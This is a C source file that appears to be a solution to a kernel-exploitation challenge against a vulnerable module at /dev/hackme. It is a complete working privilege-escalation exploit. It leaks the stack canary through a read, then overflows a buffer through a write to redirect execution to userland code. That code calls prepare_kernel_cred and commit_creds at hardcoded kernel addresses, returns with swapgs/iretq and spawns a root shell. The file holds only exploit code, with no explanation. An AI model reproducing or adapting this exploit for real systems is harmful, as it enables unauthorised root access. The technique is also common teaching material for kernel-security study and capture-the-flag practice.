#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

int fd_ko;
void open_module()
{
    fd_ko = open("/dev/hackme", O_RDWR);
    if (fd_ko < 0)
    {
        printf("open fail");
        exit(0);
    }
}
long int canary = 0;
void read_module()
{
    long int tmp[0x10 + 5];
    int check = read(fd_ko, tmp, sizeof(tmp));
    if (check < 0)
    {
        printf("read fail\n");
        exit(0);
    }
    for (int i = 0; i < 0x10 + 5; i++)
    {
        printf("hackme[%d]: %lp\n", i, tmp[i]);
    }
    canary = tmp[16];
}

void get_shell(void)
{
    puts("[*] Returned to userland");
    if (getuid() == 0)
    {
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    }
    else
    {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long user_rip = (unsigned long)get_shell + 1;

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;");
    puts("[*] Saved state");
}

void escalate_privs(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" // prepare_kernel_cred
        "xor rdi, rdi;"
        "call rax; mov rdi, rax;"
        "movabs rax, 0xffffffff814c6410;" // commit_creds
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;");
}

void write_module()
{
    long int tmp[0x20];
    memset(tmp, 'a', 0x10 * 8);
    tmp[0x10] = canary;
    tmp[0x11] = 0;                        // pop rdx
    tmp[0x12] = 0;                        // pop r12
    tmp[0x13] = 0;                        // pop r12
    tmp[0x14] = (long int)escalate_privs; // saved rip
    int check = write(fd_ko, tmp, sizeof(tmp));
    if (check < 0)
    {
        printf("write fail\n");
    }
}

int main()
{
    save_state();
    open_module();
    read_module();
    write_module();
}